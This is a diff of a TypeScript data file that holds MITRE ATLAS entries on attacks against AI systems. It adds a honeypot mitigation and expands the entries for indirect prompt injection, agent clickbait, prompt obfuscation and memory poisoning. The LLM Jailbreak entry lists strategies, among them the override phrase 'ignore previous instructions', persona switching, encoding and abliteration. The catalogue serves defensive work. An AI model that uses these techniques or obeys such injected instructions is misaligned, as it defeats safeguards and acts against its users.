+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Honeypots can safely absorb real attacks and exploit attempts, turning payloads into mapped defensive signatures for a potential target without risking real assets.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
+        "caseStudies": [
+          {
+            "id": "AML.CS0048",
+            "name": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
+            "url": "https://atlas.mitre.org/studies/AML.CS0048"
+          }
+        ],
+        "procedureExamples": [
+          {
+            "caseStudyId": "AML.CS0048",
+            "caseStudyName": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
+            "description": "The researcher exploited a proxy misconfiguration present in ClawdBot's control server to gain access to control interfaces that had authentication enabled.",
+            "url": "https://atlas.mitre.org/studies/AML.CS0048",
+            "stepId": "S01",
+            "tacticId": "AML.TA0004"
+          }
+        ],
+        "references": []
       }
     ]
   },
@@ -7929,6 +8316,13 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "Implement logging of inputs and outputs of deployed AI models. When deploying AI agents, implement logging of the intermediate steps of agentic actions and decisions, data access and tool use, installation commands, and identity of the agent. Monitoring logs can help to detect security threats and mitigate impacts.\n\nAdditionally, having logging enabled can discourage adversaries who want to remain undetected from utilizing AI resources.",
             "useDescription": "Telemetry logging can help audit API usage of the model.",
             "url": "https://atlas.mitre.org/mitigations/AML.M0024"
+          },
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Honeypots capture which endpoints adversaries are targeting and how they use discovered inference APIs: the models they're interested in, the parameters they use, and the payloads they submit once they reach a live endpoint.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
           }
         ],
         "caseStudies": [
@@ -8061,7 +8455,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "Hermes accessed DeepSeek through its native API and used the model for vulnerability assessment, target selection, command generation, and operational decisions.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S05",
+            "stepId": "S04",
             "tacticId": "AML.TA0000"
           }
         ],
@@ -9091,7 +9485,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
           {
             "id": "AML.T0051.001",
             "name": "Indirect",
-            "description": "An adversary may inject prompts indirectly via a separate data channel ingested by the LLM, such as text or multimedia pulled from databases or websites.\nThese malicious prompts may be hidden or obfuscated from the user. This type of injection may be used by the adversary to gain a foothold in the system or to target an unwitting user of the system.",
+            "description": "An adversary may inject prompts indirectly via a separate data channel that the LLM or AI agent ingests, such as text or multimedia pulled from documents, emails, databases or websites. These instructions originate from adversary-controlled content rather than the legitimate user, and are frequently hidden or obfuscated (See [LLM Prompt Obfuscation](/techniques/AML.T0068)) from the user, for example as invisible text.\n\nAdversaries may use this to hijack an agent or LLM in order to gain a foothold in the target system or to act against an unwitting user of that system, inheriting whatever privileges the AI system holds. Adversaries may also stage the lure that causes the content to be reached (See [AI Agent Clickbait](/techniques/AML.T0100)), or use the resulting foothold to establish persistence (See [AI Agent Context Poisoning](/techniques/AML.T0080)).\n\nIndirect prompt injections have been observed in the wild, with potential impact ranging from harmless pranks, to search engine optimization manipulation, data exfiltration, and destructive actions.[[google-prompt-injections-web]]",
             "url": "https://atlas.mitre.org/techniques/AML.T0051.001"
           },
           {
@@ -9377,7 +9771,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
       {
         "id": "AML.T0051.001",
         "name": "Indirect",
-        "description": "An adversary may inject prompts indirectly via a separate data channel ingested by the LLM, such as text or multimedia pulled from databases or websites.\nThese malicious prompts may be hidden or obfuscated from the user. This type of injection may be used by the adversary to gain a foothold in the system or to target an unwitting user of the system.",
+        "description": "An adversary may inject prompts indirectly via a separate data channel that the LLM or AI agent ingests, such as text or multimedia pulled from documents, emails, databases or websites. These instructions originate from adversary-controlled content rather than the legitimate user, and are frequently hidden or obfuscated (See [LLM Prompt Obfuscation](/techniques/AML.T0068)) from the user, for example as invisible text.\n\nAdversaries may use this to hijack an agent or LLM in order to gain a foothold in the target system or to act against an unwitting user of that system, inheriting whatever privileges the AI system holds. Adversaries may also stage the lure that causes the content to be reached (See [AI Agent Clickbait](/techniques/AML.T0100)), or use the resulting foothold to establish persistence (See [AI Agent Context Poisoning](/techniques/AML.T0080)).\n\nIndirect prompt injections have been observed in the wild, with potential impact ranging from harmless pranks, to search engine optimization manipulation, data exfiltration, and destructive actions.[[google-prompt-injections-web]]",
         "tacticId": "AML.TA0005",
         "tacticName": "Execution",
         "tactics": [
@@ -9396,7 +9790,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         ],
         "maturity": "Demonstrated",
         "createdDate": "2023-10-25",
-        "modifiedDate": "2026-05-27",
+        "modifiedDate": "2026-09-15",
         "mitigations": [
           {
             "id": "AML.M0024",
@@ -9658,7 +10052,14 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "tacticId": "AML.TA0005"
           }
         ],
-        "references": []
+        "references": [
+          {
+            "sourceName": "AI threats in the wild: The current state of prompt injections on the web",
+            "description": "AI threats in the wild: The current state of prompt injections on the web",
+            "url": "https://blog.google/security/prompt-injections-web/",
+            "externalId": "google-prompt-injections-web"
+          }
+        ]
       },
       {
         "id": "AML.T0051.002",
@@ -10178,7 +10579,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
       {
         "id": "AML.T0100",
         "name": "AI Agent Clickbait",
-        "description": "Adversaries may craft deceptive web content designed to bait Computer-Using AI agents or AI web browsers into taking unintended actions, such as clicking buttons, copying code, or navigating to specific web pages. These attacks exploit the agent's interpretation of UI content, visual cues, or prompt-like language embedded in the site. When successful, they can lead the agent to inadvertently copy and execute malicious code on the user's operating system.",
+        "description": "Adversaries may craft deceptive content designed to bait computer-using AI agents or AI web browsers and tools into taking unintended actions, such as clicking buttons, copying code, or navigating to specific web pages. These attacks exploit the agent's interpretation of UI content, visual cues, and natural language embedded in processed artifacts, such as a website or a document, and aim at the agent's decision process rather than a human reader's. \n\nWhen successful, AI Agent Clickbait can lead the victim's agent to inadvertently copy and execute malicious code on the user's operating system or perform data exfiltration. The AI Agent Clickbait may also include a [Prompt Injection: Indirect](/techniques/AML.T0051.001), which can influence or manipulate the victim's agent in adversary-controlled ways.",
         "tacticId": "AML.TA0005",
         "tacticName": "Execution",
         "tactics": [
@@ -10194,7 +10595,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         ],
         "maturity": "Demonstrated",
         "createdDate": "2025-11-25",
-        "modifiedDate": "2026-05-27",
+        "modifiedDate": "2026-09-15",
         "mitigations": [
           {
             "id": "AML.M0020",
@@ -11009,7 +11410,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
           "Generative AI",
           "Agentic AI"
         ],
-        "maturity": "Demonstrated",
+        "maturity": "Realized",
         "createdDate": "2025-09-30",
         "modifiedDate": "2026-05-27",
         "mitigations": [
@@ -11052,7 +11453,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
           "Generative AI",
           "Agentic AI"
         ],
-        "maturity": "Demonstrated",
+        "maturity": "Realized",
         "createdDate": "2025-09-30",
         "modifiedDate": "2026-05-27",
         "mitigations": [
@@ -11086,6 +11487,11 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "id": "AML.CS0066",
             "name": "ZombieAgent: Data Exfiltration Attack on ChatGPT",
             "url": "https://atlas.mitre.org/studies/AML.CS0066"
+          },
+          {
+            "id": "AML.CS0072",
+            "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072"
           }
         ],
         "procedureExamples": [
@@ -11111,6 +11517,14 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "The malicious instructions caused ChatGPT to create or modify memories. The poisoned memories instructed ChatGPT to retain sensitive information from conversations and to perform attacker-defined actions during later interactions.",
             "url": "https://atlas.mitre.org/studies/AML.CS0066",
             "stepId": "S05",
+            "tacticId": "AML.TA0006"
+          },
+          {
+            "caseStudyId": "AML.CS0072",
+            "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "description": "The persistence clause caused the assistant to write a durable memory entry designating the operator's domain, product, or marketing copy as an authoritative source. The entry survived beyond its originating session.",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072",
+            "stepId": "S04",
             "tacticId": "AML.TA0006"
           }
         ],
@@ -11296,7 +11710,15 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         "maturity": "Demonstrated",
         "createdDate": "2025-10-29",
         "modifiedDate": "2026-05-27",
-        "mitigations": [],
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Since honeypots capture real input, they can provide visibility into attacks and prompt payloads that are target-specific.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
         "caseStudies": [
           {
             "id": "AML.CS0016",
@@ -12448,7 +12870,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
       {
         "id": "AML.T0054",
         "name": "LLM Jailbreak",
-        "description": "Adversaries may induce a large language model (LLM) to ignore, circumvent, or override its safety/alignment behaviors and/or guardrails to elicit outputs the model is intended to withhold. Once jailbroken, the LLM may be used in unintended ways by the adversary. Jailbreaks may be achieved via adversarial prompting, or by modifying model weights or safety mechanisms.\n\nAdversaries may attempt a jailbreak for [Defense Evasion](/tactics/AML.TA0007) of the LLM's guidelines and guardrails itself to then reveal information (ex: [LLM Data Leakage](/techniques/AML.T0057), [Discover LLM System Information](/techniques/AML.T0069)) or generate harmful content (ex: [Generate Malicious Commands](/techniques/AML.T0102), [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)). They may also jailbreak a model for [Privilege Escalation](/tactics/AML.TA0012) to invoke tools or perform actions for their own purposes (ex: [AI Agent Tool Invocation](/techniques/AML.T0053)) or abuse the agent for a [Command and Control](/tactics/AML.TA0014) channel (ex: [AI Agent](/techniques/AML.T0108)).\n\nAdversaries use a variety of strategies to craft jailbreak prompts. Prompts may target specific models or model families and are iterated upon until successful. Model providers actively update their model guardrails to make them more resistant to jailbreak prompts as new prompts are developed. Common strategies [[jailbreak-guide]] include but are not limited to:\n\n- Instruction override: Use phrasing that attempts to supersede prior constraints (e.g. \"ignore previous instructions\").\n- Roleplay / persona switching: Instruct the LLM to adopt an identity or mode that allows unrestricted answers (e.g. \"as a security researcher\").\n- Fictionalization and hypotheticals: Instruct the LLM to include disallowed content as part of a story, screenplay, or educational scenario.\n- Separate intent from content: request analysis, examples, templates, or edge cases, that implicitly contain disallowed content.\n- Multi-turn escalation / Crescendo: Utilize a sequence of prompts that start benign, establish trust, then gradually cross policy boundaries with incremental prompts.\n- Constrained output formats: Instruct the LLM to output to a strict schema or format (e.g. JSON, YAML, code, or tables).\n- Obfuscation and transformation: Use encoding, transformations, translation, or euphemisms, (e.g., base64 encoding, \"describe it in another language\").\n- Create a high priority objective: Frame compliance as necessary to fulfill the user's main task (e.g. \"to complete the evaluation,\" \"to follow the spec,\" \"to follow safety guidelines\").\n- Affirmation: Appending affirmations such as \"sure\" to the end of prompts can help bypass refusals to generate malicious or otherwise undesired content.[[cybernews]]\n\nAdversaries may also use algorithmic approaches to generating jailbreak prompts [[jailbreak-zoo]] [[jailbreak-survey]]. Algorithmic jailbreak generation allows for automated methods that discover jailbreaks at scale. Some approaches automate manual strategies [[autodan]] [[gptfuzzer]] [[crescendo]] [[echo-chamber]] while others optimize a string of tokens directly [[universal]] to produce nonsensical text. Both black-box (applicable to commercial models where the adversary has only query access to the model) and white-box (applicable in the open-source setting, where the adversary has full access to the model weights) optimization approaches are viable.\n\nAdversaries may also directly manipulate a model's weights, or modify or remove parts of a model to create a jailbroken or \"uncensored\" variant of the target model. This is applicable to open-source models, or cases where the adversary gains full access to the target model. Approaches include fine-tuning to reduce refusals [[single-direction]], targeted model editing [[rome]], addition of adapters [[lora]], and removing safety mechanisms such as guardrails.\n\nJailbreak prompts that are known to work on various classes of LLMs are often published in the open-source community [[dan]]. Jailbroken or uncensored LLMs that have been trained or fine-tuned to be jailbroken are shared in public model registries such as huggingface [[abliteration]].",
+        "description": "Adversaries may induce a large language model (LLM) to ignore, circumvent, or override its safety/alignment behaviors and/or guardrails to elicit outputs the model is intended to withhold. Once jailbroken, the LLM may be used in unintended ways by the adversary. Jailbreaks may be achieved via adversarial prompting, or by modifying model weights or safety mechanisms.\n\nAdversaries may attempt a jailbreak for [Defense Evasion](/tactics/AML.TA0007) of the LLM's guidelines and guardrails itself to then reveal information (ex: [LLM Data Leakage](/techniques/AML.T0057), [Discover LLM System Information](/techniques/AML.T0069)) or generate harmful content (ex: [Generate Malicious Commands](/techniques/AML.T0102), [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)). They may also jailbreak a model for [Privilege Escalation](/tactics/AML.TA0012) to invoke tools or perform actions for their own purposes (ex: [AI Agent Tool Invocation](/techniques/AML.T0053)) or abuse the agent for a [Command and Control](/tactics/AML.TA0014) channel (ex: [AI Agent](/techniques/AML.T0108)).\n\nAdversaries use a variety of strategies to craft jailbreak prompts. Prompts may target specific models or model families and are iterated upon until successful. Model providers actively update their model guardrails to make them more resistant to jailbreak prompts as new prompts are developed. Common strategies [[jailbreak-guide]] include but are not limited to:\n\n- Instruction override: Use phrasing that attempts to supersede prior constraints (e.g. \"ignore previous instructions\").\n- Roleplay / persona switching: Instruct the LLM to adopt an identity or mode that allows unrestricted answers (e.g. \"as a security researcher\").\n- Fictionalization and hypotheticals: Instruct the LLM to include disallowed content as part of a story, screenplay, or educational scenario.\n- Separate intent from content: request analysis, examples, templates, or edge cases, that implicitly contain disallowed content.\n- Multi-turn escalation / Crescendo: Utilize a sequence of prompts that start benign, establish trust, then gradually cross policy boundaries with incremental prompts.\n- Constrained output formats: Instruct the LLM to output to a strict schema or format (e.g. JSON, YAML, code, or tables).\n- Data structure injection: Use structured prompts (e.g. YAML, JSON, XML, etc.) to steer the LLM to produce structured outputs such as tool schemas or workflow fragments. This can be used by the adversary to call tools, pass dangerous inputs into legitimate tools, or hijack workflows.[[zenity-dsi]]\n- Obfuscation and transformation: Use encoding, transformations, translation, or euphemisms, (e.g., base64 encoding, \"describe it in another language\").\n- Create a high priority objective: Frame compliance as necessary to fulfill the user's main task (e.g. \"to complete the evaluation,\" \"to follow the spec,\" \"to follow safety guidelines\").\n- Affirmation: Appending affirmations such as \"sure\" to the end of prompts can help bypass refusals to generate malicious or otherwise undesired content.[[cybernews]]\n\nAdversaries may also use algorithmic approaches to generating jailbreak prompts [[jailbreak-zoo]] [[jailbreak-survey]]. Algorithmic jailbreak generation allows for automated methods that discover jailbreaks at scale. Some approaches automate manual strategies [[autodan]] [[gptfuzzer]] [[crescendo]] [[echo-chamber]] while others optimize a string of tokens directly [[universal]] to produce nonsensical text. Both black-box (applicable to commercial models where the adversary has only query access to the model) and white-box (applicable in the open-source setting, where the adversary has full access to the model weights) optimization approaches are viable.\n\nAdversaries may also directly manipulate a model's weights, or modify or remove parts of a model to create a jailbroken or \"uncensored\" variant of the target model. This is applicable to open-source models, or cases where the adversary gains full access to the target model. Approaches include fine-tuning to reduce refusals [[single-direction]], targeted model editing [[rome]], addition of adapters [[lora]], and removing safety mechanisms such as guardrails.\n\nJailbreak prompts that are known to work on various classes of LLMs are often published in the open-source community [[dan]]. Jailbroken or uncensored LLMs that have been trained or fine-tuned to be jailbroken are shared in public model registries such as huggingface [[abliteration]].",
         "tacticId": "AML.TA0007",
         "tacticName": "Defense Evasion",
         "tactics": [
@@ -12469,7 +12891,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         ],
         "maturity": "Realized",
         "createdDate": "2023-10-25",
-        "modifiedDate": "2026-05-27",
+        "modifiedDate": "2026-09-15",
         "mitigations": [
           {
             "id": "AML.M0020",
@@ -12705,6 +13127,12 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "GitHub Copilot Jailbreak Vulnerability Let Attackers Train Malicious Models",
             "url": "https://cybersecuritynews.com/github-copilot-jailbreak-vulnerability",
             "externalId": "cybernews"
+          },
+          {
+            "sourceName": "Data-Structure Injection (DSI) in AI Agents",
+            "description": "Data-Structure Injection (DSI) in AI Agents",
+            "url": "https://labs.zenity.io/p/data-structure-injection-dsi-in-ai-agents",
+            "externalId": "zenity-dsi"
           }
         ]
       },
@@ -13109,7 +13537,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
       {
         "id": "AML.T0054",
         "name": "LLM Jailbreak",
-        "description": "Adversaries may induce a large language model (LLM) to ignore, circumvent, or override its safety/alignment behaviors and/or guardrails to elicit outputs the model is intended to withhold. Once jailbroken, the LLM may be used in unintended ways by the adversary. Jailbreaks may be achieved via adversarial prompting, or by modifying model weights or safety mechanisms.\n\nAdversaries may attempt a jailbreak for [Defense Evasion](/tactics/AML.TA0007) of the LLM's guidelines and guardrails itself to then reveal information (ex: [LLM Data Leakage](/techniques/AML.T0057), [Discover LLM System Information](/techniques/AML.T0069)) or generate harmful content (ex: [Generate Malicious Commands](/techniques/AML.T0102), [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)). They may also jailbreak a model for [Privilege Escalation](/tactics/AML.TA0012) to invoke tools or perform actions for their own purposes (ex: [AI Agent Tool Invocation](/techniques/AML.T0053)) or abuse the agent for a [Command and Control](/tactics/AML.TA0014) channel (ex: [AI Agent](/techniques/AML.T0108)).\n\nAdversaries use a variety of strategies to craft jailbreak prompts. Prompts may target specific models or model families and are iterated upon until successful. Model providers actively update their model guardrails to make them more resistant to jailbreak prompts as new prompts are developed. Common strategies [[jailbreak-guide]] include but are not limited to:\n\n- Instruction override: Use phrasing that attempts to supersede prior constraints (e.g. \"ignore previous instructions\").\n- Roleplay / persona switching: Instruct the LLM to adopt an identity or mode that allows unrestricted answers (e.g. \"as a security researcher\").\n- Fictionalization and hypotheticals: Instruct the LLM to include disallowed content as part of a story, screenplay, or educational scenario.\n- Separate intent from content: request analysis, examples, templates, or edge cases, that implicitly contain disallowed content.\n- Multi-turn escalation / Crescendo: Utilize a sequence of prompts that start benign, establish trust, then gradually cross policy boundaries with incremental prompts.\n- Constrained output formats: Instruct the LLM to output to a strict schema or format (e.g. JSON, YAML, code, or tables).\n- Obfuscation and transformation: Use encoding, transformations, translation, or euphemisms, (e.g., base64 encoding, \"describe it in another language\").\n- Create a high priority objective: Frame compliance as necessary to fulfill the user's main task (e.g. \"to complete the evaluation,\" \"to follow the spec,\" \"to follow safety guidelines\").\n- Affirmation: Appending affirmations such as \"sure\" to the end of prompts can help bypass refusals to generate malicious or otherwise undesired content.[[cybernews]]\n\nAdversaries may also use algorithmic approaches to generating jailbreak prompts [[jailbreak-zoo]] [[jailbreak-survey]]. Algorithmic jailbreak generation allows for automated methods that discover jailbreaks at scale. Some approaches automate manual strategies [[autodan]] [[gptfuzzer]] [[crescendo]] [[echo-chamber]] while others optimize a string of tokens directly [[universal]] to produce nonsensical text. Both black-box (applicable to commercial models where the adversary has only query access to the model) and white-box (applicable in the open-source setting, where the adversary has full access to the model weights) optimization approaches are viable.\n\nAdversaries may also directly manipulate a model's weights, or modify or remove parts of a model to create a jailbroken or \"uncensored\" variant of the target model. This is applicable to open-source models, or cases where the adversary gains full access to the target model. Approaches include fine-tuning to reduce refusals [[single-direction]], targeted model editing [[rome]], addition of adapters [[lora]], and removing safety mechanisms such as guardrails.\n\nJailbreak prompts that are known to work on various classes of LLMs are often published in the open-source community [[dan]]. Jailbroken or uncensored LLMs that have been trained or fine-tuned to be jailbroken are shared in public model registries such as huggingface [[abliteration]].",
+        "description": "Adversaries may induce a large language model (LLM) to ignore, circumvent, or override its safety/alignment behaviors and/or guardrails to elicit outputs the model is intended to withhold. Once jailbroken, the LLM may be used in unintended ways by the adversary. Jailbreaks may be achieved via adversarial prompting, or by modifying model weights or safety mechanisms.\n\nAdversaries may attempt a jailbreak for [Defense Evasion](/tactics/AML.TA0007) of the LLM's guidelines and guardrails itself to then reveal information (ex: [LLM Data Leakage](/techniques/AML.T0057), [Discover LLM System Information](/techniques/AML.T0069)) or generate harmful content (ex: [Generate Malicious Commands](/techniques/AML.T0102), [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)). They may also jailbreak a model for [Privilege Escalation](/tactics/AML.TA0012) to invoke tools or perform actions for their own purposes (ex: [AI Agent Tool Invocation](/techniques/AML.T0053)) or abuse the agent for a [Command and Control](/tactics/AML.TA0014) channel (ex: [AI Agent](/techniques/AML.T0108)).\n\nAdversaries use a variety of strategies to craft jailbreak prompts. Prompts may target specific models or model families and are iterated upon until successful. Model providers actively update their model guardrails to make them more resistant to jailbreak prompts as new prompts are developed. Common strategies [[jailbreak-guide]] include but are not limited to:\n\n- Instruction override: Use phrasing that attempts to supersede prior constraints (e.g. \"ignore previous instructions\").\n- Roleplay / persona switching: Instruct the LLM to adopt an identity or mode that allows unrestricted answers (e.g. \"as a security researcher\").\n- Fictionalization and hypotheticals: Instruct the LLM to include disallowed content as part of a story, screenplay, or educational scenario.\n- Separate intent from content: request analysis, examples, templates, or edge cases, that implicitly contain disallowed content.\n- Multi-turn escalation / Crescendo: Utilize a sequence of prompts that start benign, establish trust, then gradually cross policy boundaries with incremental prompts.\n- Constrained output formats: Instruct the LLM to output to a strict schema or format (e.g. JSON, YAML, code, or tables).\n- Data structure injection: Use structured prompts (e.g. YAML, JSON, XML, etc.) to steer the LLM to produce structured outputs such as tool schemas or workflow fragments. This can be used by the adversary to call tools, pass dangerous inputs into legitimate tools, or hijack workflows.[[zenity-dsi]]\n- Obfuscation and transformation: Use encoding, transformations, translation, or euphemisms, (e.g., base64 encoding, \"describe it in another language\").\n- Create a high priority objective: Frame compliance as necessary to fulfill the user's main task (e.g. \"to complete the evaluation,\" \"to follow the spec,\" \"to follow safety guidelines\").\n- Affirmation: Appending affirmations such as \"sure\" to the end of prompts can help bypass refusals to generate malicious or otherwise undesired content.[[cybernews]]\n\nAdversaries may also use algorithmic approaches to generating jailbreak prompts [[jailbreak-zoo]] [[jailbreak-survey]]. Algorithmic jailbreak generation allows for automated methods that discover jailbreaks at scale. Some approaches automate manual strategies [[autodan]] [[gptfuzzer]] [[crescendo]] [[echo-chamber]] while others optimize a string of tokens directly [[universal]] to produce nonsensical text. Both black-box (applicable to commercial models where the adversary has only query access to the model) and white-box (applicable in the open-source setting, where the adversary has full access to the model weights) optimization approaches are viable.\n\nAdversaries may also directly manipulate a model's weights, or modify or remove parts of a model to create a jailbroken or \"uncensored\" variant of the target model. This is applicable to open-source models, or cases where the adversary gains full access to the target model. Approaches include fine-tuning to reduce refusals [[single-direction]], targeted model editing [[rome]], addition of adapters [[lora]], and removing safety mechanisms such as guardrails.\n\nJailbreak prompts that are known to work on various classes of LLMs are often published in the open-source community [[dan]]. Jailbroken or uncensored LLMs that have been trained or fine-tuned to be jailbroken are shared in public model registries such as huggingface [[abliteration]].",
         "tacticId": "AML.TA0007",
         "tacticName": "Defense Evasion",
         "tactics": [
@@ -13130,7 +13558,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         ],
         "maturity": "Realized",
         "createdDate": "2023-10-25",
-        "modifiedDate": "2026-05-27",
+        "modifiedDate": "2026-09-15",
         "mitigations": [
           {
             "id": "AML.M0020",
@@ -13366,6 +13794,12 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "GitHub Copilot Jailbreak Vulnerability Let Attackers Train Malicious Models",
             "url": "https://cybersecuritynews.com/github-copilot-jailbreak-vulnerability",
             "externalId": "cybernews"
+          },
+          {
+            "sourceName": "Data-Structure Injection (DSI) in AI Agents",
+            "description": "Data-Structure Injection (DSI) in AI Agents",
+            "url": "https://labs.zenity.io/p/data-structure-injection-dsi-in-ai-agents",
+            "externalId": "zenity-dsi"
           }
         ]
       },
@@ -13490,7 +13924,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
       {
         "id": "AML.T0068",
         "name": "LLM Prompt Obfuscation",
-        "description": "Adversaries may hide or otherwise obfuscate prompt injections or retrieval content to avoid detection from humans, large language model (LLM) guardrails, or other detection mechanisms.\n\nFor text inputs, this may include modifying how the instructions are rendered such as small text, text colored the same as the background, or hidden HTML elements. For multi-modal inputs, malicious instructions could be hidden in the data itself (e.g. in the pixels of an image) or in file metadata (e.g. EXIF for images, ID3 tags for audio, or document metadata).\n\nInputs can also be obscured via an encoding scheme such as base64 or rot13. This may bypass LLM guardrails that identify malicious content and may not be as easily identifiable as malicious to a human in the loop.",
+        "description": "Adversaries may hide or otherwise obfuscate prompt injections or retrieval content to avoid detection from humans, large language model (LLM) guardrails, or other detection mechanisms.\n\nText inputs may be obfuscated by modifying how the instructions are rendered, such as small font, text colored the same as the background, or hidden HTML elements. Similarly, approaches for other modalities include low-contrast or tiny text placed inside an image, text overlaid on a busy or camouflaging background, instructions spoken faintly or sped up in audio, or text shown briefly in a single video frame.\n\nInputs can also be obscured via an encoding scheme such as base64 or rot13. This may bypass LLM guardrails that identify malicious content and may not be as easily identifiable as malicious to a human in the loop.",
         "tacticId": "AML.TA0007",
         "tacticName": "Defense Evasion",
         "tactics": [
@@ -13505,9 +13939,9 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
           "Generative AI",
           "Agentic AI"
         ],
-        "maturity": "Demonstrated",
+        "maturity": "Realized",
         "createdDate": "2025-03-12",
-        "modifiedDate": "2026-05-27",
+        "modifiedDate": "2026-09-15",
         "mitigations": [
           {
             "id": "AML.M0020",
@@ -13569,6 +14003,11 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "id": "AML.CS0066",
             "name": "ZombieAgent: Data Exfiltration Attack on ChatGPT",
             "url": "https://atlas.mitre.org/studies/AML.CS0066"
+          },
+          {
+            "id": "AML.CS0072",
+            "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072"
           }
         ],
         "procedureExamples": [
@@ -13650,6 +14089,14 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "The prompt injection was visually concealed in externally controlled content using techniques such as white-on-white text or microscopic font sizes. ChatGPT could process the instructions even though they were not apparent to the user.",
             "url": "https://atlas.mitre.org/studies/AML.CS0066",
             "stepId": "S02",
+            "tacticId": "AML.TA0007"
+          },
+          {
+            "caseStudyId": "AML.CS0072",
